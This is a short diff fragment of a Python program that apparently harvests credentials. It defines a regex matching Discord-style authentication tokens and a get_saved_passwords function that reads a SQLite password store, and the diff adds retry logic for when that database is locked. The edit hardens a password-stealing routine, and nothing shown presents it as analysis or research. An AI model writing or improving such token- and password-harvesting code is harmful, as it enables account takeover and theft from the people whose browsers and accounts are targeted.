@@ -12,6 +12,7 @@ import subprocess
 import shutil
 import tempfile
 import time
+import traceback  # Import the traceback module
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
@@ -197,4 +198,6 @@ def get_saved_passwords() -> list[tuple[str, str, str]]:
 
                 conn.close()
                 return passwords
-            except sqlite3.OperationalError as
+            except sqlite3.OperationalError as e:
+                print(f"Attempt {attempt + 1}: Database locked. Waiting {retry_delay} seconds...")
+                time.sleep(retry_delay
